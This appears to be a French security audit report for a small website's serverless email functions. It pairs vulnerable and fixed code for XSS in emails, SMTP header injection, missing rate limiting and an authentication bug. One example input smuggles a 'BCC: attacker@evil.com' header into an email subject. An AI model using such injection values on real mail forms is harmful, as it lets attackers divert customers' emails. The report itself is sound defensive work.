Comparaisons Avant / Après — Code
V-02 Critique XSS — Injection HTML dans les emails

✗ AVANT (Vulnérable)

// Données brutes injectées directement dans HTML const name = req.body.name; // Si name = '<script>...</script>' // → injecté tel quel dans l'email HTML <p>Bonjour <strong>${name}</strong></p>

⚠ Un attaquant pouvant injecter du HTML arbitraire dans les emails envoyés aux clients ou à l'admin.

✓ APRÈS (Sécurisé)

// Échappement HTML systématique function escapeHtml(str) { return str .replace(/&/g, '&amp;') .replace(/</g, '&lt;') .replace(/>/g, '&gt;') .replace(/"/g, '&quot;'); } const safeName = escapeHtml(name); <p>Bonjour <strong>${safeName}</strong></p>

✓ Tous les caractères spéciaux HTML sont encodés avant insertion dans le template.

V-03 Critique Email Header Injection

✗ AVANT (Vulnérable)

// subject utilisé directement subject: `Commande: ${subject}` // Si subject = "Test\r\nBCC: attacker@evil.com" // → envoie une copie à l'attaquant

⚠ Permet de détourner les emails vers des destinataires non autorisés via injection de headers SMTP.

✓ APRÈS (Sécurisé)

// Suppression des sauts de ligne const emailSubject = `Commande: ${safeSubject}` .replace(/[\r\n]/g, ''); // Les injections de headers sont neutralisées

✓ Les retours à la ligne (\r\n) qui permettaient d'injecter des headers SMTP sont systématiquement supprimés.

V-04 Élevé Rate Limiting absent sur les serverless

✗ AVANT (Vulnérable)

// Aucune protection export default async function handler(req, res) { // Accepte TOUTES les requêtes sans limite // → spam illimité possible }

⚠ Un bot pouvait envoyer des milliers d'emails en quelques secondes, causant des coûts SMTP et épuisant les quotas.

✓ APRÈS (Sécurisé)

// Rate limiting par IP en mémoire const ip = getClientIp(req); if (!checkRateLimit(ip, 5, 60_000)) { return sendError(res, 429, 'Too many requests'); } // Contact: 5 req/min // Commandes: 5 req/5min

✓ Chaque IP est limitée à 5 requêtes par minute (contact) et 5 requêtes par 5 minutes (commandes).

V-01 Critique verifyToken() retourne toujours false — API bloquée

✗ AVANT (Bug Critique)

// Toujours false = toutes les routes bloquées function verifyToken(token) { return false; // ← jamais implémenté } // /api/* protégé MAIS public_paths // ne contenait pas /api/contact // → 403 sur toutes les API

⚠ En production Express, TOUTES les routes API retournaient 403 Forbidden, rendant le site non fonctionnel.

✓ APRÈS (Corrigé)

// Routes publiques correctement déclarées PUBLIC_PATHS: [ '/', '/contact', '/services', '/api/contact', // ← ajouté '/api/send-order-email', // ← ajouté '/api/test' // ← ajouté ] // Les routes publiques bypass la vérif token

✓ Les endpoints publics sont correctement exclus de la vérification d'authentification.

Fichiers Modifiés / Créés

api/lib/security.ts NOUVEAU

  • Bibliothèque de sécurité partagée pour toutes les fonctions serverless
  • escapeHtml() — encodage HTML complet des entités
  • sanitizeString() — suppression des caractères de contrôle + troncature
  • isValidEmail() / isValidPhone() — validation de format
  • checkRateLimit() — rate limiter en mémoire par IP
  • setCorsHeaders() — restriction CORS au domaine autorisé
  • sendError() — réponses d'erreur génériques sans fuite d'information

api/contact.ts

  • Ajout CORS restrictif (domaine somatisme.vercel.app uniquement)
  • Limite body: 20 KB maximum
  • Rate limiting: 5 req/minute par IP
  • Validation stricte: longueur max, format email, champs minimum
  • Échappement HTML sur toutes les variables injectées dans l'email
  • Prévention header injection sur le sujet (suppression \r\n)
  • Messages d'erreur génériques sans exposition de détails internes

api/send-order-email.ts

  • Ajout CORS restrictif
  • Limite body: 2 MB (pour autoriser le PDF base64)
  • Rate limiting: 5 req / 5 minutes par IP (protection anti-spam commandes)
  • Validation des orderItems: type tableau, max 50 articles, prix numériques
  • Validation email/téléphone côté serveur
  • Échappement HTML sur toutes les données client et produits
  • Sujets email protégés contre l'injection de headers
  • Erreurs internes masquées (loggées serveur, message générique client)

server/security.ts

  • Correction critique: ajout des routes API publiques dans PUBLIC_PATHS
  • Correction du bug req.session (CSRF middleware)
  • /api/contact, /api/send-order-email, /api/test ajoutés comme chemins publics

Recommandations pour le Futur

1. Configurer les variables SMTP sur Vercel

Ajouter SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, EMAIL_TO dans le dashboard Vercel → Settings → Environment Variables

2. Activer Cloudflare (gratuit)

Passer le domaine somatisme.ma via Cloudflare pour bénéficier du WAF, DDoS protection, et CDN mondial

3. Implémenter reCAPTCHA v3

Ajouter Google reCAPTCHA sur le formulaire de contact et le formulaire de commande pour bloquer les bots

4. Monitoring et alertes

Configurer Sentry ou Vercel Analytics pour détecter les erreurs et comportements anormaux en temps réel

5. Audit régulier

Effectuer un audit de sécurité à chaque ajout de fonctionnalité majeure (authentification, paiement, upload de fichiers)
